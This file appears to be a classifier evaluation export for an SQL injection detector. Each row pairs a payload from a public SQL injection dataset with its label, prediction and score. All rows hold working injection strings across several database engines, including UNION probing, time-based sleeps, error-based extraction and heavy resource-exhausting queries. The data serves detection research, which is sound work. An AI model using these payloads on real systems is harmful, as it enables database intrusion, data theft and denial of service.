text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"1' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'lqql' = 'lqql",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2376,1,1,0.9999948740005493,1
"select count ( * )  from generate_series ( 1,5000000 )  and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2387,1,1,0.999994158744812,1
1'+ ( select iwbs where 4939 = 4939,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2395,1,1,0.9999943971633911,1
"1'  )  )   as kwre where 7775 = 7775 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2399,1,1,0.9999946355819702,1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  # lchh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2414,1,1,0.9999943971633911,1
"1' )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,834,1,1,0.9999945163726807,1
"1""  )  )   and make_set ( 8266 = 9226,9226 )  and   (  (  ""omjx"" like ""omjx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2425,1,1,0.9999946355819702,1
"1  )  )   as rual where 4649 = 4649 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2435,1,1,0.9999946355819702,1
"-7060' )  or make_set ( 4233 = 1689,1689 )  and  ( 'twpr' like 'twpr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2440,1,1,0.9999946355819702,1
"-9810' )  where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2448,1,1,0.9999946355819702,1
"-4589"" )  union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2459,1,1,0.9999945163726807,1
"1'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'gucd' = 'gucd",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2469,1,1,0.9999946355819702,1
"1"" )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1371,1,1,0.9999946355819702,1
"-7831""  )  )   as krzi where 3798 = 3798 order by 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2480,1,1,0.9999946355819702,1
"-5996 )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1397,1,1,0.9999947547912598,1
1'|| ( select 'mlwj' from dual where 4247 = 4247 and 1702 = 8469 ) ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2493,1,1,0.9999943971633911,1
1'+ ( select 'dpun' where 4760 = 4760,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2496,1,1,0.9999943971633911,1
"1""  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  ""vypw"" like ""vypw",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2508,1,1,0.9999947547912598,1
"1%"" and 5411 = 7697 and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2520,1,1,0.9999943971633911,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1827,1,1,0.9999945163726807,1
"-7101  )  )   )  union all select 4587,4587,4587,4587,4587,4587--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2532,1,1,0.9999946355819702,1
-8523 )  as hzqs where 8944 = 8944 order by 1--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2544,1,1,0.9999943971633911,1
"1%' and elt ( 7619 = 1489,1489 )  and '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2557,1,1,0.9999946355819702,1
"-3278'  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  'zxig' like 'zxig",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2562,1,1,0.9999946355819702,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # cdjm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1827,1,1,0.9999923706054688,1
select pg_sleep ( 5 )  and 'zfyy' = 'zfyy,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2572,1,1,0.9999946355819702,1
-9311  )  )   or  ( 5065 = 2572 ) *2572 and   (  (  1199 = 1199,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2584,1,1,0.9999947547912598,1
"1""  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""ruvo"" like ""ruvo",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2598,1,1,0.9999947547912598,1
"1"" )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""bmbg"" like ""bmbg",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2603,1,1,0.9999947547912598,1
"1""  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""opgb"" like ""opgb",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2609,1,1,0.9999946355819702,1
"1' )  as ybuv where 9641 = 9641 union all select null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2636,1,1,0.9999945163726807,1
1 )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1291,1,1,0.9999947547912598,1
waitfor delay '0:0:5' and  ( 'yauq' = 'yauq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,25449,1,1,0.9999947547912598,1
select  ( case when  ( 4568 = 4241 )  then 4568 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2648,1,1,0.9999946355819702,1
1 )  as odqn where 3910 = 3910,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2658,1,1,0.9999943971633911,1
"1', ( select  ( case when  ( 5777 = 5777 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2661,1,1,0.9999946355819702,1
"1'  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'novq' = 'novq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2673,1,1,0.9999948740005493,1
"1'|| ( select 'sned' where 4957 = 4957 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2686,1,1,0.9999946355819702,1
"1'+ ( select jxgx where 7446 = 7446 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2697,1,1,0.9999946355819702,1
1 )  and 2457 = 8146,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2705,1,1,0.9999942779541016,1
select sleep ( 5 )  and   (  (   ( 5552 = 5552,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2711,1,1,0.9999946355819702,1
"1""  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1291,1,1,0.9999947547912598,1
"1%""  )  )   )  or sleep ( 5 )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2725,1,1,0.9999946355819702,1
1'  )  )   as qaki where 5272 = 5272,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2738,1,1,0.9999945163726807,1
"1""  )  )   and 5421 = 4804--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2748,1,1,0.9999947547912598,1
"-5205'  )  )   union all select 8592,8592,8592,8592,8592,8592--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2752,1,1,0.9999946355819702,1
"1""  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,645,1,1,0.9999946355819702,1
"-9659  )  )   )  union all select 8665,8665,8665,8665,8665,8665,8665--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2764,1,1,0.9999943971633911,1
"( select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2414,1,1,0.9999945163726807,1
"1 )  where 8164 = 8164 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2775,1,1,0.9999946355819702,1
"1 )  union all select null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1981,1,1,0.9999943971633911,1
"-5187"" )  union all select 3373,3373#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2785,1,1,0.9999945163726807,1
1' and 1661 = 1244 and 'dcha' = 'dcha,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2797,1,1,0.9999946355819702,1
"1' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( 'rgue' like 'rgue",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2807,1,1,0.9999947547912598,1
"1"" )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1291,1,1,0.9999947547912598,1
"1' )  as saqp where 6612 = 6612 union all select null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2817,1,1,0.9999943971633911,1
"1 )  as hlit where 4973 = 4973 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2830,1,1,0.9999947547912598,1
1'  )  )   as fqia where 1936 = 1936 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2845,1,1,0.9999947547912598,1
"1""  )  )   as riui where 2605 = 2605",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2855,1,1,0.9999946355819702,1
1%'  )  )   )  and 7533 = 7533 and   (  (   ( '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2866,1,1,0.9999946355819702,1
-1468'  )  )   )  or 4875 = 6163#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2881,1,1,0.9999946355819702,1
1'  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,645,1,1,0.9999946355819702,1
"-7320"" )  where 3907 = 3907 union all select 3907,3907--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2891,1,1,0.9999947547912598,1
"-3834'  )  )   )  union all select 8313,8313--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2894,1,1,0.9999946355819702,1
1' )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( 'cmqe' like 'cmqe,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2906,1,1,0.9999946355819702,1
1'  )  )   and 6690 = 3250#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2918,1,1,0.9999947547912598,1
"1"" )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,787,1,1,0.9999946355819702,1
"1'  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'isyg' = 'isyg",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2940,1,1,0.9999948740005493,1
select  ( case when  ( 2593 = 3592 )  then 2593 else 2593* ( select 2593 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2943,1,1,0.9999933242797852,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( 'egnv' like 'egnv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2956,1,1,0.9999946355819702,1
1'+ ( select pagd where 2484 = 2484,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2969,1,1,0.9999942779541016,1
select  ( case when  ( 4774 = 1535 )  then 4774 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2975,1,1,0.9999946355819702,1
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and 'qcsi' = 'qcsi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2985,1,1,0.9999947547912598,1
1' )  as gogu where 4338 = 4338 union all select null#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2996,1,1,0.9999945163726807,1
"1  )  )   )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1371,1,1,0.9999946355819702,1
-2432'  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  'ejhp' = 'ejhp,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3009,1,1,0.9999947547912598,1
"1%"" )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1970,1,1,0.9999946355819702,1
"1'  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  'fowu' like 'fowu",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3021,1,1,0.9999947547912598,1
"1,iif ( 6625 = 6625,1,1/0 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3030,1,1,0.9999942779541016,1
"select count ( * )  from generate_series ( 1,5000000  )  )  ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,839,1,1,0.9999940395355225,1
"-9959"" )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""vcwc"" = ""vcwc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3034,1,1,0.9999947547912598,1
"1"" and elt ( 2373 = 5817,5817 )  and ""rsdt"" = ""rsdt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3044,1,1,0.9999946355819702,1
1%'  )  )   )  and 4595 = 4595#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3054,1,1,0.9999946355819702,1
"1  )  )   and make_set ( 8554 = 3286,3286 )  and   (  (  7385 = 7385",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3064,1,1,0.9999947547912598,1
1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1291,1,1,0.9999946355819702,1
"1' )  as noqp where 4042 = 4042 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3078,1,1,0.9999946355819702,1
select pg_sleep ( 5  )  )  ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3091,1,1,0.9999943971633911,1
1 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1291,1,1,0.9999947547912598,1
1 )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( 7015 = 7015,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3098,1,1,0.9999946355819702,1
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'ayjb' like 'ayjb",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3103,1,1,0.9999946355819702,1
"1%'  )  )   )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,834,1,1,0.9999945163726807,1
"-4031""  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""auhn"" = ""auhn",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3113,1,1,0.9999947547912598,1
-6488' or 5164 = 9234,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3125,1,1,0.999994158744812,1
1' waitfor delay '0:0:5' and 'jree' = 'jree,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3135,1,1,0.9999946355819702,1
"1""  )  )   as wnzf where 3352 = 3352 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3140,1,1,0.9999946355819702,1
-4538'  )  )   )  or 3260 = 1236 and   (  (   ( 'hpnd' like 'hpnd,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3151,1,1,0.9999946355819702,1
"select count ( * )  from generate_series ( 1,5000000 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,839,1,1,0.9999915361404419,1
"1"" )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""azpb"" = ""azpb",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3163,1,1,0.9999946355819702,1
"1, ( select  ( case when  ( 5777 = 5777 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2661,1,1,0.9999946355819702,1
"1""  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""quni"" = ""quni",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3176,1,1,0.9999948740005493,1
"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'drui' like 'drui",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3190,1,1,0.9999947547912598,1
"1', ( select  ( case when  ( 1609 = 1609 )  then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases )  end  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,2306,1,1,0.9999947547912598,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'yqrt' like 'yqrt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3203,1,1,0.9999945163726807,1
"1%'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3212,1,1,0.9999946355819702,1
1' )  and 7533 = 7533,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3217,1,1,0.9999945163726807,1
"1'  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  'inrm' like 'inrm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3222,1,1,0.9999947547912598,1
"1%"" )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1291,1,1,0.9999947547912598,1
1'+ ( select 'vjoj' where 5348 = 5348,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3233,1,1,0.9999943971633911,1
"1%'  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,834,1,1,0.9999945163726807,1
"1  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,834,1,1,0.9999945163726807,1
1%' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1291,1,1,0.9999946355819702,1
"1"" where 6111 = 6111 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3251,1,1,0.9999945163726807,1
"select count ( * )  from generate_series ( 1,5000000  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,839,1,1,0.9999939203262329,1
"1  )  )   as jyfo where 8121 = 8121 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3253,1,1,0.9999946355819702,1
"1' )  where 6731 = 6731 or elt ( 5873 = 5873,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,3261,1,1,0.9999947547912598,1
